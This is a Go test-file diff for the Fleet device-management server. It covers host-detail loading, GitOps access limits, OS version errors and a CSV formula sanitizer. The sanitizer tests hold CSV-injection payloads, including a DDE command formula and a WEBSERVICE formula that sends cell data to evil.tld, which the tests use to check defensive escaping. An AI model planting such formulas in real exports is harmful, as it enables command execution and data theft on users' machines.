@@ -17,6 +17,7 @@ import (
 	"time"
 
 	"github.com/WatchBeam/clock"
+	"github.com/fleetdm/fleet/v4/pkg/optjson"
 	activity_api "github.com/fleetdm/fleet/v4/server/activity/api"
 	"github.com/fleetdm/fleet/v4/server/authz"
 	"github.com/fleetdm/fleet/v4/server/config"
@@ -437,6 +438,9 @@ func TestHostDetailsMDMTimestamps(t *testing.T) {
 	ds.LoadHostSoftwareFunc = func(ctx context.Context, host *fleet.Host, includeCVEScores bool) error {
 		return nil
 	}
+	ds.LoadHostMDMAppleDeviceVitalsFunc = func(ctx context.Context, host *fleet.Host) error {
+		return nil
+	}
 	ds.ListPoliciesForHostFunc = func(ctx context.Context, host *fleet.Host) ([]*fleet.HostPolicy, error) {
 		return nil, nil
 	}
@@ -528,6 +532,119 @@ func TestHostDetailsMDMTimestamps(t *testing.T) {
 				assert.False(t, ds.GetNanoMDMEnrollmentDetailsFuncInvoked)
 				assert.Nil(t, hostDetail.LastMDMEnrolledAt)
 				assert.Nil(t, hostDetail.LastMDMCheckedInAt)
+			}
+		})
+	}
+}
+
+// TestHostDetailsSkipsDeviceVitalsForPersonalEnrollment is a regression test:
+// BYOD/personal enrollments never receive the device vitals fields (see
+// byodDeviceInformationQueryKeys in server/mdm/apple/commander.go), so
+// getHostDetails shouldn't even load them -- both to avoid an unnecessary
+// datastore call and so a personal host's response can't carry data it was
+// never supposed to have.
+func TestHostDetailsSkipsDeviceVitalsForPersonalEnrollment(t *testing.T) {
+	ds := new(mock.Store)
+	svc := &Service{ds: ds}
+	ds.AppConfigFunc = func(ctx context.Context) (*fleet.AppConfig, error) {
+		return &fleet.AppConfig{MDM: fleet.MDM{EnabledAndConfigured: true}}, nil
+	}
+	ds.ListLabelsForHostFunc = func(ctx context.Context, hid uint) ([]*fleet.Label, error) {
+		return nil, nil
+	}
+	ds.ListPacksForHostFunc = func(ctx context.Context, hid uint) ([]*fleet.Pack, error) {
+		return nil, nil
+	}
+	ds.LoadHostSoftwareFunc = func(ctx context.Context, host *fleet.Host, includeCVEScores bool) error {
+		return nil
+	}
+	ds.LoadHostMDMAppleDeviceVitalsFunc = func(ctx context.Context, host *fleet.Host) error {
+		host.HostMDMAppleDeviceVitals = fleet.HostMDMAppleDeviceVitals{
+			PushToken: []byte("sensitive-push-token"),
+		}
+		return nil
+	}
+	ds.ListPoliciesForHostFunc = func(ctx context.Context, host *fleet.Host) ([]*fleet.HostPolicy, error) {
+		return nil, nil
+	}
+	ds.ListHostBatteriesFunc = func(ctx context.Context, hostID uint) ([]*fleet.HostBattery, error) {
+		return nil, nil
+	}
+	ds.ListUpcomingHostMaintenanceWindowsFunc = func(ctx context.Context, hid uint) ([]*fleet.HostMaintenanceWindow, error) {
+		return nil, nil
+	}
+	ds.GetHostLockWipeStatusFunc = func(ctx context.Context, host *fleet.Host) (*fleet.HostLockWipeStatus, error) {
+		return &fleet.HostLockWipeStatus{}, nil
+	}
+	ds.ScimUserByHostIDFunc = func(ctx context.Context, hostID uint) (*fleet.ScimUser, error) {
+		return nil, nil
+	}
+	ds.ListHostDeviceMappingFunc = func(ctx context.Context, id uint) ([]*fleet.HostDeviceMapping, error) {
+		return nil, nil
+	}
+	ds.ConditionalAccessBypassedAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
+		return nil, nil
+	}
+	ds.GetHostCustomHostVitalsFunc = func(ctx context.Context, hostID uint) ([]fleet.HostCustomHostVital, error) {
+		return nil, nil
+	}
+	ds.GetHostMDMAppleProfilesFunc = func(ctx context.Context, uuid string) ([]fleet.HostMDMAppleProfile, error) {
+		return nil, nil
+	}
+	ds.GetHostMDMWindowsProfilesFunc = func(ctx context.Context, uuid string) ([]fleet.HostMDMWindowsProfile, error) {
+		return nil, nil
+	}
+	ds.GetConfigEnableDiskEncryptionFunc = func(ctx context.Context, teamID *uint) (fleet.DiskEncryptionConfig, error) {
+		return fleet.DiskEncryptionConfig{}, nil
+	}
+	ds.IsHostDiskEncryptionKeyArchivedFunc = func(ctx context.Context, hostID uint) (bool, error) {
+		return false, nil
+	}
+	ds.GetHostRecoveryLockPasswordStatusFunc = func(ctx context.Context, hostUUID string) (*fleet.HostMDMRecoveryLockPassword, error) {
+		return nil, nil
+	}
+	ds.GetHostManagedLocalAccountStatusFunc = func(ctx context.Context, hostUUID string) (*fleet.HostMDMManagedLocalAccount, error) {
+		return nil, nil
+	}
+	ds.GetHostDeviceNameEnforcementFunc = func(ctx context.Context, hostUUID string) (*fleet.HostDeviceNameEnforcement, error) {
+		return nil, nil
+	}
+	ds.GetNanoMDMEnrollmentDetailsFunc = func(ctx context.Context, hostUUID string) (*fleet.NanoMDMEnrollmentDetails, error) {
+		return &fleet.NanoMDMEnrollmentDetails{}, nil
+	}
+	ds.GetHostMDMAppleEnrollmentPermissionsFunc = func(ctx context.Context, hostUUID string) (*fleet.HostMDMApplePermissions, error) {
+		return nil, nil
+	}
+
+	personal := fleet.MDMEnrollmentStatusPersonal
+	manual := fleet.MDMEnrollmentStatusManual
+
+	cases := []struct {
+		name             string
+		enrollmentStatus *string
+		wantVitalsLoaded bool
+	}{
+		{"personal enrollment", &personal, false},
+		{"non-personal enrollment", &manual, true},
+		{"unknown enrollment status", nil, true},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			ds.LoadHostMDMAppleDeviceVitalsFuncInvoked = false
+			host := &fleet.Host{
+				ID:       3,
+				Platform: "ipados",
+				UUID:     "abc123",
+				MDM:      fleet.MDMHostData{EnrollmentStatus: tc.enrollmentStatus},
+			}
+			opts := fleet.HostDetailOptions{ExcludeSoftware: true}
+			hostDetail, err := svc.getHostDetails(test.UserContext(context.Background(), test.UserAdmin), host, opts)
+			require.NoError(t, err)
+			assert.Equal(t, tc.wantVitalsLoaded, ds.LoadHostMDMAppleDeviceVitalsFuncInvoked)
+			if tc.wantVitalsLoaded {
+				assert.Equal(t, []byte("sensitive-push-token"), hostDetail.PushToken)
+			} else {
+				assert.Equal(t, fleet.HostMDMAppleDeviceVitals{}, hostDetail.HostMDMAppleDeviceVitals)
 			}
 		})
 	}
@@ -917,6 +1034,7 @@ func TestHostDetailsHostNameStatus(t *testing.T) {
 	ds.ListLabelsForHostFunc = func(ctx context.Context, hid uint) ([]*fleet.Label, error) { return nil, nil }
 	ds.ListPacksForHostFunc = func(ctx context.Context, hid uint) ([]*fleet.Pack, error) { return nil, nil }
 	ds.LoadHostSoftwareFunc = func(ctx context.Context, host *fleet.Host, includeCVEScores bool) error { return nil }
+	ds.LoadHostMDMAppleDeviceVitalsFunc = func(ctx context.Context, host *fleet.Host) error { return nil }
 	ds.ListPoliciesForHostFunc = func(ctx context.Context, host *fleet.Host) ([]*fleet.HostPolicy, error) { return nil, nil }
 	ds.ListHostBatteriesFunc = func(ctx context.Context, hostID uint) ([]*fleet.HostBattery, error) { return nil, nil }
 	ds.ListUpcomingHostMaintenanceWindowsFunc = func(ctx context.Context, hid uint) ([]*fleet.HostMaintenanceWindow, error) {
@@ -1031,6 +1149,239 @@ func TestHostDetailsHostNameStatus(t *testing.T) {
 			return &fleet.AppConfig{MDM: fleet.MDM{EnabledAndConfigured: true}}, nil
 		}
 		ds.GetHostDeviceNameEnforcementFunc = func(ctx context.Context, hostUUID string) (*fleet.HostDeviceNameEnforcement, error) {
+			return nil, errors.New("db exploded")
+		}
+
+		ctx := license.NewContext(t.Context(), &fleet.LicenseInfo{Tier: fleet.TierPremium})
+		_, err := svc.getHostDetails(test.UserContext(ctx, test.UserAdmin),
+			&fleet.Host{ID: 42, Platform: "darwin", UUID: "test-uuid"}, fleet.HostDetailOptions{})
+		require.Error(t, err)
+		require.Contains(t, err.Error(), "db exploded")
+	})
+}
+
+func TestHostDetailsOSUpdates(t *testing.T) {
+	ds := new(mock.Store)
+	svc := &Service{ds: ds}
+
+	ds.ListLabelsForHostFunc = func(ctx context.Context, hid uint) ([]*fleet.Label, error) { return nil, nil }
+	ds.ListPacksForHostFunc = func(ctx context.Context, hid uint) ([]*fleet.Pack, error) { return nil, nil }
+	ds.LoadHostSoftwareFunc = func(ctx context.Context, host *fleet.Host, includeCVEScores bool) error { return nil }
+	ds.LoadHostMDMAppleDeviceVitalsFunc = func(ctx context.Context, host *fleet.Host) error { return nil }
+	ds.ListPoliciesForHostFunc = func(ctx context.Context, host *fleet.Host) ([]*fleet.HostPolicy, error) { return nil, nil }
+	ds.ListHostBatteriesFunc = func(ctx context.Context, hostID uint) ([]*fleet.HostBattery, error) { return nil, nil }
+	ds.ListUpcomingHostMaintenanceWindowsFunc = func(ctx context.Context, hid uint) ([]*fleet.HostMaintenanceWindow, error) {
+		return nil, nil
+	}
+	ds.GetHostMDMMacOSSetupFunc = func(ctx context.Context, hid uint) (*fleet.HostMDMMacOSSetup, error) { return nil, nil }
+	ds.GetHostMDMAppleProfilesFunc = func(ctx context.Context, uuid string) ([]fleet.HostMDMAppleProfile, error) { return nil, nil }
+	ds.GetHostLockWipeStatusFunc = func(ctx context.Context, host *fleet.Host) (*fleet.HostLockWipeStatus, error) {
+		return &fleet.HostLockWipeStatus{}, nil
+	}
+	ds.ScimUserByHostIDFunc = func(ctx context.Context, hostID uint) (*fleet.ScimUser, error) { return nil, nil }
+	ds.ListHostDeviceMappingFunc = func(ctx context.Context, id uint) ([]*fleet.HostDeviceMapping, error) { return nil, nil }
+	ds.ConditionalAccessBypassedAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) { return nil, nil }
+	ds.GetHostCustomHostVitalsFunc = func(ctx context.Context, hostID uint) ([]fleet.HostCustomHostVital, error) {
+		return nil, nil
+	}
+	ds.IsHostDiskEncryptionKeyArchivedFunc = func(ctx context.Context, hostID uint) (bool, error) { return false, nil }
+	ds.GetNanoMDMEnrollmentDetailsFunc = func(ctx context.Context, hostUUID string) (*fleet.NanoMDMEnrollmentDetails, error) {
+		return &fleet.NanoMDMEnrollmentDetails{}, nil
+	}
+	ds.GetHostRecoveryLockPasswordStatusFunc = func(ctx context.Context, hostUUID string) (*fleet.HostMDMRecoveryLockPassword, error) {
+		return nil, nil
+	}
+	ds.GetHostManagedLocalAccountStatusFunc = func(ctx context.Context, hostUUID string) (*fleet.HostMDMManagedLocalAccount, error) {
+		return nil, nil
+	}
+	ds.GetHostDeviceNameEnforcementFunc = func(ctx context.Context, hostUUID string) (*fleet.HostDeviceNameEnforcement, error) {
+		return nil, nil
+	}
+
+	// enforceVersion builds settings pinned to a specific minimum version, the
+	// mode where the config itself carries the target and deadline.
+	enforceVersion := func(minimumVersion, deadline string) fleet.AppleOSUpdateSettings {
+		return fleet.AppleOSUpdateSettings{
+			MinimumVersion: optjson.SetString(minimumVersion),
+			Deadline:       optjson.SetString(deadline),
+		}
+	}
+	// enforceLatest builds "latest" settings, where the target version and
+	// deadline are resolved per host.
+	enforceLatest := func(deadlineDays int) fleet.AppleOSUpdateSettings {
+		return fleet.AppleOSUpdateSettings{
+			MinimumVersion: optjson.SetString(fleet.AppleOSUpdateLatestVersion),
+			DeadlineDays:   optjson.SetInt(deadlineDays),
+		}
+	}
+	deadline := time.Date(2026, 9, 15, 0, 0, 0, 0, time.UTC)
+
+	cases := []struct {
+		name string
+		// mdm is the app config MDM settings; teamMDM, when non-nil, is what
+		// TeamLite reports for the host's team and must win over mdm.
+		mdm          fleet.MDM
+		teamMDM      *fleet.TeamMDM
+		platform     string
+		osUpdateHost *fleet.AppleSoftwareUpdateHost
+		// wantOSUpdateHostQueried asserts whether the per-host resolved row was
+		// looked up, which only happens in "latest" mode.
+		wantOSUpdateHostQueried bool
+		wantMinimumVersion      *string
+		wantDeadline            *string
+	}{
+		{
+			name:     "not configured",
+			mdm:      fleet.MDM{EnabledAndConfigured: true},
+			platform: "darwin",
+		},
+		{
+			name: "macOS specific version from app config",
+			mdm: fleet.MDM{
+				EnabledAndConfigured: true,
+				MacOSUpdates:         enforceVersion("15.6.1", "2026-09-15"),
+			},
+			platform:           "darwin",
+			wantMinimumVersion: new("15.6.1"),
+			wantDeadline:       new("2026-09-15"),
+		},
+		{
+			name: "iOS host reads the iOS settings",
+			mdm: fleet.MDM{
+				EnabledAndConfigured: true,
+				MacOSUpdates:         enforceVersion("15.6.1", "2026-09-15"),
+				IOSUpdates:           enforceVersion("18.7", "2026-10-01"),
+				IPadOSUpdates:        enforceVersion("18.6", "2026-11-01"),
+			},
+			platform:           "ios",
+			wantMinimumVersion: new("18.7"),
+			wantDeadline:       new("2026-10-01"),
+		},
+		{
+			name: "iPadOS host reads the iPadOS settings",
+			mdm: fleet.MDM{
+				EnabledAndConfigured: true,
+				MacOSUpdates:         enforceVersion("15.6.1", "2026-09-15"),
+				IOSUpdates:           enforceVersion("18.7", "2026-10-01"),
+				IPadOSUpdates:        enforceVersion("18.6", "2026-11-01"),
+			},
+			platform:           "ipados",
+			wantMinimumVersion: new("18.6"),
+			wantDeadline:       new("2026-11-01"),
+		},
+		{
+			name: "non-Apple platform never reports OS updates",
+			mdm: fleet.MDM{
+				EnabledAndConfigured: true,
+				MacOSUpdates:         enforceVersion("15.6.1", "2026-09-15"),
+			},
+			platform: "windows",
+		},
+		{
+			name: "latest with a resolved target",
+			mdm: fleet.MDM{
+				EnabledAndConfigured: true,
+				MacOSUpdates:         enforceLatest(14),
+			},
+			platform: "darwin",
+			osUpdateHost: &fleet.AppleSoftwareUpdateHost{
+				HostUUID:        "test-uuid",
+				TargetOSVersion: "26.1",
+				TargetDeadline:  &deadline,
+			},
+			wantOSUpdateHostQueried: true,
+			wantMinimumVersion:      new("26.1"),
+			wantDeadline:            new("2026-09-15"),
+		},
+		{
+			name: "latest with no row yet",
+			mdm: fleet.MDM{
+				EnabledAndConfigured: true,
+				MacOSUpdates:         enforceLatest(14),
+			},
+			platform:                "darwin",
+			wantOSUpdateHostQueried: true,
+			wantMinimumVersion:      new("Pending"),
+			wantDeadline:            new("Pending"),
+		},
+		{
+			name: "team settings win over app config",
+			mdm: fleet.MDM{
+				EnabledAndConfigured: true,
+				MacOSUpdates:         enforceVersion("15.6.1", "2026-09-15"),
+			},
+			teamMDM:            &fleet.TeamMDM{MacOSUpdates: enforceVersion("26.0.1", "2026-12-24")},
+			platform:           "darwin",
+			wantMinimumVersion: new("26.0.1"),
+			wantDeadline:       new("2026-12-24"),
+		},
+		{
+			name: "team without OS updates configured overrides a configured app config",
+			mdm: fleet.MDM{
+				EnabledAndConfigured: true,
+				MacOSUpdates:         enforceVersion("15.6.1", "2026-09-15"),
+			},
+			teamMDM:  &fleet.TeamMDM{},
+			platform: "darwin",
+		},
+	}
+
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			ds.AppConfigFunc = func(ctx context.Context) (*fleet.AppConfig, error) {
+				return &fleet.AppConfig{MDM: c.mdm}, nil
+			}
+			ds.GetMDMWindowsBitLockerStatusFunc = func(ctx context.Context, host *fleet.Host) (*fleet.HostMDMDiskEncryption, error) {
+				return nil, nil
+			}
+			ds.TeamLiteFuncInvoked = false
+			ds.TeamLiteFunc = func(ctx context.Context, id uint) (*fleet.TeamLite, error) {
+				require.NotNil(t, c.teamMDM, "team config must not be loaded for a no-team host")
+				return &fleet.TeamLite{ID: id, Config: fleet.TeamConfigLite{MDM: *c.teamMDM}}, nil
+			}
+			ds.GetAppleOSUpdateHostByUUIDFuncInvoked = false
+			ds.GetAppleOSUpdateHostByUUIDFunc = func(ctx context.Context, hostUUID string) (*fleet.AppleSoftwareUpdateHost, error) {
+				require.Equal(t, "test-uuid", hostUUID)
+				return c.osUpdateHost, nil
+			}
+
+			host := &fleet.Host{ID: 42, Platform: c.platform, UUID: "test-uuid"}
+			if c.teamMDM != nil {
+				host.TeamID = new(uint(1))
+			}
+
+			ctx := license.NewContext(t.Context(), &fleet.LicenseInfo{Tier: fleet.TierPremium})
+			hd, err := svc.getHostDetails(test.UserContext(ctx, test.UserAdmin), host, fleet.HostDetailOptions{})
+			require.NoError(t, err)
+			require.NotNil(t, hd)
+
+			assert.Equal(t, c.teamMDM != nil, ds.TeamLiteFuncInvoked)
+			assert.Equal(t, c.wantOSUpdateHostQueried, ds.GetAppleOSUpdateHostByUUIDFuncInvoked)
+			assert.Equal(t, c.wantMinimumVersion, hd.OSUpdateMinimumVersion)
+			assert.Equal(t, c.wantDeadline, hd.OSUpdateDeadline)
+		})
+	}
+
+	t.Run("team lookup error propagates", func(t *testing.T) {
+		ds.AppConfigFunc = func(ctx context.Context) (*fleet.AppConfig, error) {
+			return &fleet.AppConfig{MDM: fleet.MDM{EnabledAndConfigured: true}}, nil
+		}
+		ds.TeamLiteFunc = func(ctx context.Context, id uint) (*fleet.TeamLite, error) {
+			return nil, errors.New("no such team")
+		}
+
+		ctx := license.NewContext(t.Context(), &fleet.LicenseInfo{Tier: fleet.TierPremium})
+		_, err := svc.getHostDetails(test.UserContext(ctx, test.UserAdmin),
+			&fleet.Host{ID: 42, Platform: "darwin", UUID: "test-uuid", TeamID: new(uint(1))}, fleet.HostDetailOptions{})
+		require.Error(t, err)
+		require.Contains(t, err.Error(), "no such team")
+	})
+
+	t.Run("resolved OS update lookup error propagates", func(t *testing.T) {
+		ds.AppConfigFunc = func(ctx context.Context) (*fleet.AppConfig, error) {
+			return &fleet.AppConfig{MDM: fleet.MDM{EnabledAndConfigured: true, MacOSUpdates: enforceLatest(14)}}, nil
+		}
+		ds.GetAppleOSUpdateHostByUUIDFunc = func(ctx context.Context, hostUUID string) (*fleet.AppleSoftwareUpdateHost, error) {
 			return nil, errors.New("db exploded")
 		}
 
@@ -1361,6 +1712,138 @@ func TestHostAuth(t *testing.T) {
 	// List, GetHostSummary work for all
 }
 
+// TestHostByIdentifierGitOpsGetsIDOnly asserts that GitOps, which is denied on
+// every other host read endpoint, doesn't get host details from the identifier
+// endpoint either: it only gets the host id it needs to resolve an identifier
+// for the deprecated Puppet module's profile pre-assignment flow.
+func TestHostByIdentifierGitOpsGetsIDOnly(t *testing.T) {
+	ds := new(mock.Store)
+	svc, ctx := newTestService(t, ds, nil, nil)
+
+	const (
+		teamHostIdentifier   = "team-host"
+		globalHostIdentifier = "global-host"
+	)
+	teamHost := &fleet.Host{ID: 1, TeamID: new(uint(1)), Hostname: "team-host.example.com", HardwareSerial: "TEAMSERIAL", UUID: "team-uuid"}
+	globalHost := &fleet.Host{ID: 2, Hostname: "global-host.example.com", HardwareSerial: "GLOBALSERIAL", UUID: "global-uuid"}
+
+	ds.HostByIdentifierFunc = func(ctx context.Context, identifier string) (*fleet.Host, error) {
+		if identifier == teamHostIdentifier {
+			return teamHost, nil
+		}
+		return globalHost, nil
+	}
+	ds.AppConfigFunc = func(ctx context.Context) (*fleet.AppConfig, error) {
+		return &fleet.AppConfig{}, nil
+	}
+	ds.LoadHostSoftwareFunc = func(ctx context.Context, host *fleet.Host, includeCVEScores bool) error {
+		return nil
+	}
+	ds.ListLabelsForHostFunc = func(ctx context.Context, hid uint) ([]*fleet.Label, error) {
+		return nil, nil
+	}
+	ds.ListPacksForHostFunc = func(ctx context.Context, hid uint) ([]*fleet.Pack, error) {
+		return nil, nil
+	}
+	ds.ListHostBatteriesFunc = func(ctx context.Context, hid uint) ([]*fleet.HostBattery, error) {
+		return nil, nil
+	}
+	ds.ListUpcomingHostMaintenanceWindowsFunc = func(ctx context.Context, hid uint) ([]*fleet.HostMaintenanceWindow, error) {
+		return nil, nil
+	}
+	ds.ListPoliciesForHostFunc = func(ctx context.Context, host *fleet.Host) ([]*fleet.HostPolicy, error) {
+		return nil, nil
+	}
+	ds.ListHostDeviceMappingFunc = func(ctx context.Context, hid uint) ([]*fleet.HostDeviceMapping, error) {
+		return nil, nil
+	}
+	ds.ScimUserByHostIDFunc = func(ctx context.Context, hostID uint) (*fleet.ScimUser, error) {
+		return nil, nil
+	}
+	ds.GetHostCustomHostVitalsFunc = func(ctx context.Context, hostID uint) ([]fleet.HostCustomHostVital, error) {
+		return nil, nil
+	}
+	ds.ConditionalAccessBypassedAtFunc = func(ctx context.Context, hostID uint) (*time.Time, error) {
+		return nil, nil
+	}
+	ds.GetHostIssuesLastUpdatedFunc = func(ctx context.Context, hostID uint) (time.Time, error) {
+		return time.Time{}, nil
+	}
+	ds.UpdateHostIssuesFailingPoliciesForSingleHostFunc = func(ctx context.Context, hostID uint) error {
+		return nil
+	}
+	ds.IsHostDiskEncryptionKeyArchivedFunc = func(ctx context.Context, hostID uint) (bool, error) {
+		return false, nil
+	}
+	ds.GetHostLockWipeStatusFunc = func(ctx context.Context, host *fleet.Host) (*fleet.HostLockWipeStatus, error) {
+		return &fleet.HostLockWipeStatus{}, nil
+	}
+
+	// requireIDOnly asserts the caller got the host id and no other host data,
+	// and that Fleet didn't even load the details it isn't allowed to see.
+	requireIDOnly := func(t *testing.T, wantID uint, host *fleet.HostDetail, err error) {
+		t.Helper()
+		require.NoError(t, err)
+		require.NotNil(t, host)
+		require.True(t, host.IDOnly)
+		require.Equal(t, wantID, host.ID)
+		require.Empty(t, host.Hostname)
+		require.Empty(t, host.HardwareSerial)
+		require.Empty(t, host.UUID)
+		require.Nil(t, host.TeamID)
+		require.Nil(t, host.Labels)
+		require.Nil(t, host.Packs)
+		require.False(t, ds.LoadHostSoftwareFuncInvoked)
+		require.False(t, ds.ListLabelsForHostFuncInvoked)
+		require.False(t, ds.ListPoliciesForHostFuncInvoked)
+	}
+
+	opts := fleet.HostDetailOptions{IncludePolicies: true}
+
+	t.Run("global gitops", func(t *testing.T) {
+		ctx := viewer.NewContext(ctx, viewer.Viewer{User: &fleet.User{ID: 1, GlobalRole: new(fleet.RoleGitOps)}})
+
+		host, err := svc.HostByIdentifier(ctx, globalHostIdentifier, opts)
+		requireIDOnly(t, globalHost.ID, host, err)
+
+		host, err = svc.HostByIdentifier(ctx, teamHostIdentifier, opts)
+		requireIDOnly(t, teamHost.ID, host, err)
+	})
+
+	t.Run("team gitops on the host's team", func(t *testing.T) {
+		ctx := viewer.NewContext(ctx, viewer.Viewer{User: &fleet.User{
+			ID:    2,
+			Teams: []fleet.UserTeam{{Team: fleet.Team{ID: 1}, Role: fleet.RoleGitOps}},
+		}})
+
+		host, err := svc.HostByIdentifier(ctx, teamHostIdentifier, opts)
+		requireIDOnly(t, teamHost.ID, host, err)
+	})
+
+	t.Run("team gitops on another team is denied", func(t *testing.T) {
+		ctx := viewer.NewContext(ctx, viewer.Viewer{User: &fleet.User{
+			ID:    3,
+			Teams: []fleet.UserTeam{{Team: fleet.Team{ID: 2}, Role: fleet.RoleGitOps}},
+		}})
+
+		_, err := svc.HostByIdentifier(ctx, teamHostIdentifier, opts)
+		checkAuthErr(t, true, err)
+	})
+
+	// Roles that do have host read access must keep getting the full details.
+	t.Run("global observer still gets details", func(t *testing.T) {
+		ctx := viewer.NewContext(ctx, viewer.Viewer{User: &fleet.User{ID: 4, GlobalRole: new(fleet.RoleObserver)}})
+
+		host, err := svc.HostByIdentifier(ctx, globalHostIdentifier, opts)
+		require.NoError(t, err)
+		require.Equal(t, uint(2), host.ID)
+		require.Equal(t, "global-host.example.com", host.Hostname)
+		require.Equal(t, "GLOBALSERIAL", host.HardwareSerial)
+		require.True(t, ds.ListLabelsForHostFuncInvoked)
+		require.True(t, ds.ListPoliciesForHostFuncInvoked)
+	})
+}
+
 func TestListHosts(t *testing.T) {
 	ds := new(mock.Store)
 	svc, ctx := newTestService(t, ds, nil, nil)
@@ -1411,6 +1894,62 @@ func TestListHosts(t *testing.T) {
 	require.NoError(t, err)
 	require.Len(t, hosts, 1)
 	require.True(t, ds.LoadHostSoftwareFuncInvoked)
+}
+
+func TestSanitizeCSVFormula(t *testing.T) {
+	t.Parallel()
+
+	cases := []struct {
+		name string
+		in   string
+		want string
+	}{
+		{"empty", "", ""},
+		{"equals", "=1+1", "'=1+1"},
+		{"plus", "+SUM(1,1)", "'+SUM(1,1)"},
+		{"minus", "-2+3", "'-2+3"},
+		{"at", "@SUM(1,1)", "'@SUM(1,1)"},
+		{"dde command", `=cmd|'/c calc'!A1`, `'=cmd|'/c calc'!A1`},
+		{"webservice exfiltration", `=WEBSERVICE("http://evil.tld/?x="&A1)`, `'=WEBSERVICE("http://evil.tld/?x="&A1)`},
+		{"tab", "\t=1+1", "'\t=1+1"},
+		{"carriage return", "\r=1+1", "'\r=1+1"},
+		{"hyphen leading text", "-laptop", "'-laptop"},
+		{"leading space", " =1+1", "' =1+1"},
+		{"leading spaces", "   @SUM(1,1)", "'   @SUM(1,1)"},
+		{"newline then formula", "\n=1+1", "'\n=1+1"},
+
+		// Values that must be left untouched.
+		{"whitespace only", "   ", "   "},
+		{"tab then text", "\tfoo", "\tfoo"},
+		{"leading space then number", " -1", " -1"},
+		{"trailing space after number", "-5 ", "-5 "},
+		{"integer", "42", "42"},
+		{"negative integer", "-1", "-1"},
+		{"negative float", "-1.5", "-1.5"},
+		{"positive sign", "+1", "+1"},
+		{"negative exponent", "-1.5e10", "-1.5e10"},
+		{"email", "user@example.com", "user@example.com"},
+		{"timestamp", "2022-03-15T17:23:56Z", "2022-03-15T17:23:56Z"},
+		{"hostname", "foo.local0", "foo.local0"},
+		{"zero", "0", "0"},
+		{"internal equals", "a=1+1", "a=1+1"},
+		{"newline leading", "\nfoo", "\nfoo"},
+	}
+
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			t.Parallel()
+			require.Equal(t, c.want, sanitizeCSVFormula(c.in))
+		})
+	}
+
+	t.Run("already sanitized values are left alone", func(t *testing.T) {
+		t.Parallel()
+		// The single quote is not a formula trigger, so re-applying the
+		// transformation must not stack prefixes.
+		once := sanitizeCSVFormula("=1+1")
+		require.Equal(t, once, sanitizeCSVFormula(once))
+	})
 }
 
 func TestStreamHosts(t *testing.T) {
@@ -2912,6 +3451,60 @@ func TestEmptyTeamOSVersions(t *testing.T) {
 	_, _, _, err = svc.OSVersions(test.UserContext(ctx, test.UserAdmin), new(uint(4)), new("darwin"), nil, nil, fleet.ListOptions{}, false, nil)
 	require.Error(t, err)
 	require.Equal(t, "some unknown error", fmt.Sprint(err))
+}
+
+// TestOSVersionsErrorHandling covers the error-handling fixes from #49483:
+// invalid platform, invalid OS version id, and the encoding of the
+// max_vulnerabilities validation message.
+func TestOSVersionsErrorHandling(t *testing.T) {
+	ds := new(mock.Store)
+	svc, ctx := newTestService(t, ds, nil, nil)
+
+	ds.OSVersionsFunc = func(
+		ctx context.Context, teamFilter *fleet.TeamFilter, platform *string, name *string, version *string,
+	) (*fleet.OSVersions, error) {
+		return &fleet.OSVersions{CountsUpdatedAt: time.Now(), OSVersions: []fleet.OSVersion{}}, nil
+	}
+	ds.OSVersionFunc = func(
+		ctx context.Context, osVersionID uint, teamFilter *fleet.TeamFilter,
+	) (*fleet.OSVersion, *time.Time, error) {
+		return nil, nil, newNotFoundError()
+	}
+	ds.ListVulnsByMultipleOSVersionsFunc = func(ctx context.Context, osVersions []fleet.OSVersion, includeCVSS bool,
+		teamID *uint, maxVulnerabilities *int,
+	) (map[string]fleet.OSVulnerabilitiesWithCount, error) {
+		return nil, nil
+	}
+
+	admin := test.UserContext(ctx, test.UserAdmin)
+
+	// An invalid platform is rejected with a validation error instead of
+	// silently returning an empty, successful result.
+	_, _, _, err := svc.OSVersions(admin, nil, new("notrealplatform"), nil, nil, fleet.ListOptions{}, false, nil)
+	require.Error(t, err)
+	require.Contains(t, fmt.Sprint(err), "Invalid platform")
+	require.False(t, ds.OSVersionsFuncInvoked, "datastore should not be queried when the platform is invalid")
+
+	// A documented platform is still accepted.
+	_, _, _, err = svc.OSVersions(admin, nil, new("ios"), nil, nil, fleet.ListOptions{}, false, nil)
+	require.NoError(t, err)
+
+	// A negative max_vulnerabilities returns a readable message with no ">"
+	// character (JSON encoding would otherwise escape it to ">").
+	_, _, _, err = svc.OSVersions(admin, nil, nil, nil, nil, fleet.ListOptions{}, false, new(-5))
+	require.Error(t, err)
+	require.Contains(t, fmt.Sprint(err), "cannot be negative")
+	require.NotContains(t, fmt.Sprint(err), ">")
+
+	_, _, err = svc.OSVersion(admin, 1, nil, false, new(-5))
+	require.Error(t, err)
+	require.Contains(t, fmt.Sprint(err), "cannot be negative")
+
+	// A non-existent OS version id returns a not-found error rather than a
+	// 200 response with a null-filled object.
+	_, _, err = svc.OSVersion(admin, 99999, nil, false, nil)
+	require.Error(t, err)
+	require.True(t, fleet.IsNotFound(err), "expected a not-found error for a missing OS version id")
 }
 
 func TestOSVersionsListOptions(t *testing.T) {
